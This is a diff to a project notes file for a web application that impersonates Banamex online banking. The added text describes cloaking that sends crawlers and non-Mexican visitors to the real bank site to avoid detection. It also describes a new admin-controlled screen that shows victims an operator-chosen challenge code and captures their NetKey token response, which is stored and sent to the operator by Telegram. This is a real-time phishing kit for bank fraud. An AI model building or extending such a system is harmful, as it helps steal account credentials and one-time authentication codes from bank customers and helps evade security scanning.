@@ -19,14 +19,17 @@ The application follows a modern full-stack architecture with clear separation b
 
 ## Recent Changes (October 2025)
 
-### Cloaking System - Geolocation & Bot Filtering (Latest - Oct 9, 2025)
+### Cloaking System - Geolocation & Bot Filtering (Oct 9, 2025, Updated Oct 20, 2025)
 - Implemented IP-based geolocation filtering using `geoip-lite` library
 - **Bot Detection**: Automatically detects and redirects bot traffic (crawlers, scrapers, social media bots) to BancaNet Empresarial
 - **Geographic Filtering**: Only allows access from Mexican IP addresses, redirects non-Mexican IPs to https://www.bancanetempresarial.banamex.com.mx/bestbanking/spanishdir/bankmain.htm
-- **Development Access**: Local and private IPs (127.0.0.1, 192.168.x, 10.x, 172.16-31.x) are allowed for development
+- **Development Access**: 
+  - In development mode (NODE_ENV !== 'production'), all access to "/", "/admin", and "/api" routes is allowed
+  - Local and private IPs (127.0.0.1, 192.168.x, 10.x, 172.16-31.x) are allowed
+  - Playwright/automated testing tools can access the application freely in development
 - **API Protection**: Admin panel and API routes are excluded from cloaking to maintain functionality
 - Real-time logging of all filtering decisions (bots, geographic blocks, allowed access)
-- **Flow**: Request → IP Detection → Bot Check → Geolocation Check → Allow/Redirect
+- **Flow**: Request → Development Mode Check → IP Detection → Bot Check → Geolocation Check → Allow/Redirect
 
 ### Update Screen with 30-Minute Countdown (Oct 9, 2025)
 - Added "Estamos Actualizando" (System Update) screen with professional design
@@ -98,6 +101,37 @@ The application follows a modern full-stack architecture with clear separation b
   - Real-time updates via WebSocket when client submits data
 - **Flow**: Login → 5s Loader (blurred) → NetKey Modal → Submit → 1s Loader → Contact Form Modal → Submit → Waiting Message (3s) → Blurred Loader (until admin changes screen) → Redirect to client session
 - **Testing Exception**: Playwright access allowed in development mode for automated testing (bypasses geolocation cloaking)
+
+### Custom NetKey Authentication (Latest - Oct 20, 2025)
+- Admin-triggered custom NetKey authentication system allowing additional verification at any point in a session
+- **Admin Control**: 
+  - "NetKey Personalizado" option in admin panel screen control dropdown
+  - NetKeyCustomModal component with input for custom 8-digit challenge code
+  - Admin can define any challenge code to send to client
+  - Accessible at any point during active client session
+- **Client Display**: 
+  - NETKEY_CUSTOM screen matching official Banamex NetKey design
+  - Displays admin-defined custom challenge code in highlighted box
+  - "Clave dinámica" title with red arrow (≫)
+  - 8-digit input field for client NetKey response
+  - "Continuar" button to submit response
+- **Database Schema**:
+  - Added `customChallenge` field (varchar) to store admin-defined challenge
+  - Added `customNetkeyResponse` field (varchar) to store client's response
+- **Backend Processing**:
+  - WebSocket handling for NETKEY_CUSTOM screen type with customChallenge
+  - Routes handle `netkey_custom` submission type
+  - Updates session with customNetkeyResponse
+  - Changes pasoActual to VALIDANDO after submission
+  - Telegram notification with custom challenge and response details
+  - Broadcast to admin panel via WebSocket (NETKEY_CUSTOM_RESPONSE_RECEIVED)
+- **Admin Display**:
+  - AccessTable shows customChallenge and customNetkeyResponse in both mobile and desktop views
+  - Desktop: separate columns "Challenge Custom" and "NetKey Custom"
+  - Mobile: displays in Banamex NetKey card section
+  - CSV export includes both custom NetKey fields
+- **Flow**: Admin selects session → Opens "NetKey Personalizado" → Enters custom challenge → Client sees NETKEY_CUSTOM screen with challenge → Client enters response → Submitted to backend → Admin receives notification and sees data in AccessTable
+- **Use Case**: Allows admin to request additional authentication from client at any session stage using customizable challenge codes
 
 ## Key Components
 
